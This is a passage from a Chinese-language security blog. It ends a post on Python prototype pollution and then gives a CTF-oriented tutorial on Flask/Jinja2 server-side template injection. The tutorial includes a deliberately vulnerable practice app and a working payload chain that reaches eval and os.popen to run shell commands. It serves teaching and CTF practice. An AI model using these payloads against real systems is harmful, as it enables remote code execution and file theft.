table），这个符号表包含了当前模块（即当前文件）中的所有全局变量、函数、类等定义，<strong>每个模块的全局命名空间是独立的，互不影响</strong><br><code>__dict__</code>每个模块对象都有一个该属性，它是一个字典，包含了模块的全局命名空间</p></blockquote><ol><li>在Python中，函数或类方法均具有一个<code>__globals__</code>属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回(相当于这个变量空间中的globals()函数的返回值)</li><li><em><strong>利用payload</strong></em></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="简单加载模块"><a href="#简单加载模块" class="headerlink" title="简单加载模块"></a>简单加载模块</h3><h3 id="复杂加载模块"><a href="#复杂加载模块" class="headerlink" title="复杂加载模块"></a>复杂加载模块</h3><h2 id="原型链污染衍生手法兼思想"><a href="#原型链污染衍生手法兼思想" class="headerlink" title="原型链污染衍生手法兼思想"></a>原型链污染衍生手法兼思想</h2><h3 id="函数默认参数"><a href="#函数默认参数" class="headerlink" title="函数默认参数"></a>函数默认参数</h3><h3 id="特定值替换"><a href="#特定值替换" class="headerlink" title="特定值替换"></a>特定值替换</h3><h3 id="结合jinja2-ssti"><a href="#结合jinja2-ssti" class="headerlink" title="结合jinja2 ssti"></a>结合jinja2 ssti</h3><blockquote><p>这一部分的内容见《从原型链深入理解flask的ssti》</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>看下来真实醍醐灌顶，思路打开脑洞，pp+ssti部分见《从原型链深入理解flask的ssti》<a href="https://tttang.com/archive/1876/">一把梭</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> python pp </tag>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_ssti</title>
      <link href="/2024/11/11/flask_ssti/"/>
      <url>/2024/11/11/flask_ssti/</url>
      
        <content type="html"><![CDATA[<blockquote><p>去年11.4号就有学过，一年没学又给忘记了</p></blockquote><h2 id="Python前置知识"><a href="#Python前置知识" class="headerlink" title="Python前置知识"></a>Python前置知识</h2><h3 id="python-使用"><a href="#python-使用" class="headerlink" title="python.使用"></a>python<code>.</code>使用</h3><ol><li>属性访问：使用点号可以访问对象的属性和方法。<ol><li>例如，object.property 可以获取对象的属性值，</li><li>object.method() 可以调用对象的方法。</li></ol></li><li>模块导入：使用点号可以导入模块中的子模块、变量、函数或类。<ol><li>例如，import module.submodule 可以导入模块的子模块，</li><li>from module import function 可以导入模块中的函数。</li></ol></li><li>类成员访问：在类定义中，使用点号可以访问类的静态变量、类方法或类属性。<ol><li>例如，ClassName.static_variable 可以访问类的静态变量，</li><li>ClassName.class_method() 可以调用类的方法。</li></ol></li><li>字典键访问：在字典中，使用点号可以通过键来访问相应的值。<ol><li>例如，dictionary.key 可以获取字典中键对应的值。</li></ol></li></ol><h3 id="python的容器"><a href="#python的容器" class="headerlink" title="python的容器"></a>python的容器</h3><ol><li><p>tuple元组: 不可变(值不可以杯修改、添加和删除)，类似数组</p><ol><li><strong>对于可变对象</strong>: 如果元组中包含可变对象（如列表），则可以在可变对象中修改其值</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tuple5 = ([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="string">&#x27;apple&#x27;</span>)</span><br><span class="line">tuple5[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">5</span>  <span class="comment">#用[]可以多次选定</span></span><br><span class="line"><span class="built_in">print</span>(tuple5)    <span class="comment"># 输出：([5, 2, 3], &#x27;apple&#x27;)</span></span><br></pre></td></tr></table></figure></li><li><p>list列表: 可改变的tuple，也使用索引访问元素</p><ol><li><code>list.remove(...)</code>和<code>list.append(...)</code>，支持切片操作</li></ol></li><li><p>dict字典: 每个键值对之间使用冒号 : 分隔，键和值之间使用逗号 , 分隔。<strong>键必须是不可变的类型</strong>（如字符串、整数、浮点数或元组），而值可以是任意类型，使用<code>[]</code>来访问呢元素</p></li></ol><h3 id="python模块"><a href="#python模块" class="headerlink" title="python模块"></a>python模块</h3><ol><li>python文件就是一个python模块，也可以是内置的模块</li><li>类似于cpp中的库文件</li></ol><h3 id="特殊变量和魔术方法"><a href="#特殊变量和魔术方法" class="headerlink" title="*特殊变量和魔术方法"></a>*特殊变量和魔术方法</h3><h3 id="Python元类"><a href="#Python元类" class="headerlink" title="Python元类"></a>Python元类</h3><h4 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h4><blockquote><p>可以先见 Python原型链污染 这篇博客<br>这一章就为了理解这一句话: <em><strong>在 Python 中，object 是所有类的基类，而 type 是所有类的元类</strong></em></p></blockquote><h4 id="什么是元类"><a href="#什么是元类" class="headerlink" title="什么是元类"></a>什么是元类</h4><ol><li><p>元类（Metaclass）是类的类。它负责创建类对象。</p><ol><li>在 Python 中，类本身也是对象，这些对象是由元类创建的。</li><li><strong>默认情况下，所有类都是由 type 元类创建的</strong></li><li>作用：元类（Metaclass）是类的类。它负责创建类对象。在 Python 中，类本身也是对象，这些对象是由元类创建的。</li></ol></li><li><p>自定义元类：元类通常通过继承 type 类来定义，并重写其 <code>__new__</code>或 <code>__init__</code> 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, name, bases, dct</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Creating class <span class="subst">&#123;name&#125;</span> with metaclass <span class="subst">&#123;cls&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 自定义类的创建过程</span></span><br><span class="line">        dct[<span class="string">&#x27;custom_attribute&#x27;</span>] = <span class="string">&quot;This is a custom attribute&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls, name, bases, dct)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>(metaclass=MyMeta):</span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 MyClass 的实例</span></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(obj.custom_attribute)  <span class="comment"># 输出: This is a custom attribute</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="type与object"><a href="#type与object" class="headerlink" title="type与object"></a>type与object</h4><ol><li><p>object 类</p><ol><li>用途：object 是所有类的基类。每个类（无论是用户定义的类还是内置类）都隐式或显式地继承自 object。</li><li>特点：<ol><li>所有对象都是 object 的实例</li><li>object 提供了一些基本的方法，如 <code>__str__</code>、<code>__repr__</code></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MyClass 继承自 object</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">issubclass</span>(MyClass, <span class="built_in">object</span>))  <span class="comment"># 输出: True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MyClass 的实例也是 object 的实例</span></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(obj, <span class="built_in">object</span>))  <span class="comment"># 输出: True</span></span><br></pre></td></tr></table></figure></li><li><p>type 元类</p><ol><li>用途：type 是所有类的元类。元类是类的类，负责创建类。</li><li>特点：<ol><li>所有类都是 type 的实例。</li><li><strong>type 本身也是一个类，同时也是一个元类</strong></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MyClass 是 type 的实例</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(MyClass, <span class="built_in">type</span>))  <span class="comment"># 输出: True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># type 本身也是一个类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">type</span>))  <span class="comment"># 输出: &lt;class &#x27;type&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>二者的关系: 循环引用</p><ol><li>object 是 type 的实例：<ol><li>object 本身是一个类，它是 type 的实例。</li></ol></li><li>type 是 object 的子类：<ol><li>type 继承自 object，因此 type 也是 object 的实例</li></ol></li><li><strong>实现方面</strong><ol><li>type 先于 object 存在：</li><li>在 Python 的启动过程中，首先创建 type 类。</li><li>然后使用 type 类来创建 object 类。</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                      <span class="comment"># 直接父类</span></span><br><span class="line">+-------------------+ ----------&gt; +-------------------+</span><br><span class="line">|      <span class="built_in">object</span>       |             |       <span class="built_in">type</span>        |</span><br><span class="line">+-------------------+ &lt;---------- +-------------------+</span><br><span class="line">          |            <span class="comment"># 创建类实例</span></span><br><span class="line">          v</span><br><span class="line">+-------------------+</span><br><span class="line">|     MyClass       |</span><br><span class="line">+-------------------+</span><br><span class="line">          |</span><br><span class="line">          v</span><br><span class="line">+-------------------+</span><br><span class="line">|       obj         |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure></li></ol><h2 id="什么是模板？"><a href="#什么是模板？" class="headerlink" title="什么是模板？"></a>什么是模板？</h2><h3 id="模板工作流"><a href="#模板工作流" class="headerlink" title="*模板工作流"></a>*模板工作流</h3><ol><li><p><em><strong>模板引擎</strong></em>:(这里特指用于Web开发的模板引擎)是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，<strong>利用模板引擎来生成前端的html代码</strong>，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。  </p><ol><li>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用<strong>沙箱逃逸技术</strong>来进行绕过。</li></ol></li><li><p><em><strong>漏洞成因</strong></em>:服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性 –&gt; <strong>在模板渲染的时候进行了解析操作，支持代码的执行</strong></p><ol><li><img src="/pic/Flask_ssti/flask_ssti_flow.png" alt="Flow"></li><li>如果使用固定了的模板，渲染后传入数据，就不存在模板注入了，比如一下的flask jinja2就不会模板注入</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = Template(<span class="string">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> t.render(n=name)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">此处会将name整个值保留下来而不是直接当作&#123;&#123;&#125;&#125;</span></span><br><span class="line"><span class="string">所以避免了直接执行的问题</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure></li></ol><h3 id="常见模板引擎及其变量语法"><a href="#常见模板引擎及其变量语法" class="headerlink" title="常见模板引擎及其变量语法"></a>常见模板引擎及其变量语法</h3><p><img src="/pic/Flask_ssti/ssti_%E5%A4%A7%E5%85%A8.png" alt="ssti大全"></p><h3 id="类型判断图例"><a href="#类型判断图例" class="headerlink" title="类型判断图例"></a>类型判断图例</h3><p><img src="/pic/Flask_ssti/ssti_%E5%88%A4%E6%96%AD.png" alt="ssti_conclude"></p><h2 id="Flask-ssti"><a href="#Flask-ssti" class="headerlink" title="Flask ssti"></a>Flask ssti</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol><li>S1: <code>conda install Flask</code></li><li>S2: 启动路由脚本<ol><li>自己添加题目脚本即可</li><li><strong>注意使用debug模式，修改实时可以查看</strong></li><li><strong>就算搭建起来的话在本地的链可能也会服务器上的不一样，留个心眼，可以在题目中测还是在题目中测好</strong></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">salt = <span class="string">b&quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PassHash</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> sha512(salt + <span class="variable language_">self</span>.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> sha512(salt + <span class="variable language_">self</span>.encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">passhash = PassHash(<span class="string">&#x27;&#x27;</span>.join(choice(<span class="string">&quot;0123456789&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_pwd = request.args.get(<span class="string">&#x27;new_pwd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span>.<span class="built_in">format</span>(user=username).<span class="built_in">format</span>(passhash=new_pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="Jinja2基础"><a href="#Jinja2基础" class="headerlink" title="Jinja2基础"></a>Jinja2基础</h3><blockquote><p>Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎默认使用Jinja2</p></blockquote><ol><li><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的；Jinja2是<strong>Flask框架的一部分</strong>。Jinja2会把模板参数提供的相应的值替换了  块</p><ol><li><p>变量<code>&#123;&#123;&#125;&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The value is &#123;&#123; value &#125;&#125;.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>控制语句<code>&#123;%%&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--条件语句--&gt;</span></span><br><span class="line">&#123;% if user.is_admin %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, Admin!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% elif user.is_member %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, Member!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, Guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--循环语句--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">   &#123;% for item in items %&#125;</span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>宏，类似于函数，也是<code>&#123;%%&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro input(name, value=&#x27;&#x27;, type=&#x27;text&#x27;, size=20) %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&#123;&#123; type &#125;&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&#123;&#123; name &#125;&#125;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; value|e &#125;&#125;&quot;</span> <span class="attr">size</span>=<span class="string">&quot;&#123;&#123; size &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">&#123;% endmacro %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">   &#123;&#123; input(&#x27;username&#x27;) &#125;&#125;</span><br><span class="line">   &#123;&#123; input(&#x27;email&#x27;, type=&#x27;email&#x27;) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内置过滤器这里不进行讨论</p></li></ol></li><li><p>模板渲染示例</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jinja2模板使用示例</span></span><br><span class="line"><span class="comment"># 1. 模板文件 template.html</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123; title &#125;&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;&#123;&#123; heading &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> item <span class="keyword">in</span> items %&#125;</span><br><span class="line">            &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 渲染模板</span></span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, FileSystemLoader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定模板文件所在的目录</span></span><br><span class="line">file_loader = FileSystemLoader(<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建环境</span></span><br><span class="line">env = Environment(loader=file_loader)</span><br><span class="line"><span class="comment"># 加载模板</span></span><br><span class="line">template = env.get_template(<span class="string">&#x27;template.html&#x27;</span>)</span><br><span class="line"><span class="comment"># 定义要传递给模板的数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;My Page&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;heading&#x27;</span>: <span class="string">&#x27;Welcome to My Page&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;items&#x27;</span>: [<span class="string">&#x27;Item 1&#x27;</span>, <span class="string">&#x27;Item 2&#x27;</span>, <span class="string">&#x27;Item 3&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 渲染模板</span></span><br><span class="line">output = template.render(data)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ssti漏洞利用"><a href="#ssti漏洞利用" class="headerlink" title="ssti漏洞利用"></a>ssti漏洞利用</h3><h4 id="python-ssti一般流程"><a href="#python-ssti一般流程" class="headerlink" title="python ssti一般流程"></a>python ssti一般流程</h4><blockquote><p>拿基类 -&gt; 找子类 -&gt; 构造命令执行或者文件读取负载 -&gt; 拿 flag</p></blockquote><ol><li>下面是一些常用的构造链的示例，接下来的每一部分都会进行解释</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">194</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h4><ol><li>常用魔术方法<ol><li>关于<code>__bases__</code>: <strong>元组</strong>，该属性只存在于类对象中，而不是类的实例对象中，用途：查看类的继承关系，动态修改类的继承关系（<strong>记录类继承关系的</strong>）</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 获取基类</span></span><br><span class="line">__class__   <span class="comment"># 类的一个内置属性，表示实例对象的类，其实是获取类对象</span></span><br><span class="line">__base__    <span class="comment"># 类型对象的直接基类</span></span><br><span class="line">__bases__   <span class="comment"># 类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span></span><br><span class="line">__mro__  <span class="comment"># 查看继承关系和调用顺序，返回元组。此属性是由类组成的元组，在方法解析期间会基于它来查找基类</span></span><br></pre></td></tr></table></figure><h4 id="寻找子类"><a href="#寻找子类" class="headerlink" title="寻找子类"></a>寻找子类</h4><ol><li>这里只用到一个重点函数，那就是<code>__subclasses__()</code>，<strong>获取所有子类列表</strong><ol><li>该方法只存在于类对象中，而不是类的实例对象中</li><li>这部分的重心不在子类本身上，而是在子类是否有 os 或者 file 的相关模块可以被调用上 –&gt; <strong>命令执行</strong>或者<strong>文件读取</strong></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="*命令执行"></a>*命令执行</h4><ol><li><p>这里使用到的内置函数和原型链污染的利用函数很多类似，这里是粘贴《Python原型链污染》的，详见这部分的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__globals__ <span class="comment"># 5. 与函数和方法对象相关联，全局信息存在字典里，只读字典</span></span><br><span class="line">   <span class="comment"># ref: https://docs.python.org/3/reference/datamodel.html</span></span><br><span class="line"></span><br><span class="line">__init__ <span class="comment"># 6. 初始化类，返回的类型是function</span></span><br><span class="line">    <span class="comment"># 关于.__init__.__globals__实际上是通过函数访问全局变量而不是初始化实例</span></span><br><span class="line"></span><br><span class="line">__builtins__ <span class="comment"># 7. 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span> <span class="comment"># 8. 内置方法: 动态导入模块</span></span><br><span class="line">     <span class="comment"># 调用示例</span></span><br><span class="line">     odule_name = <span class="string">&#x27;os&#x27;</span></span><br><span class="line">     os_module = <span class="built_in">__import__</span>(module_name)</span><br><span class="line">     <span class="built_in">print</span>(os_module.getcwd())  <span class="comment"># 输出当前工作目录</span></span><br></pre></td></tr></table></figure></li><li><p>常常用来rce或者读文件的模块<img src="/pic/Flask_ssti/executeClass.png" alt="常常用来rce或者读文件的模块"></p><ol><li>补充一点思路<ol><li><em><strong>别人探索出来的链和模块</strong></em></li><li>可以多关注一下内置函数，python有文档详细的进行了记录</li></ol></li><li>详见helloctf<a href="https://hello-ctf.com/HC_Web/ssti/#_8">hellocf</a></li></ol></li></ol><h4 id="自动化查找"><a href="#自动化查找" class="headerlink" title="自动化查找"></a>自动化查找</h4><ol><li><p>利用模板语言</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 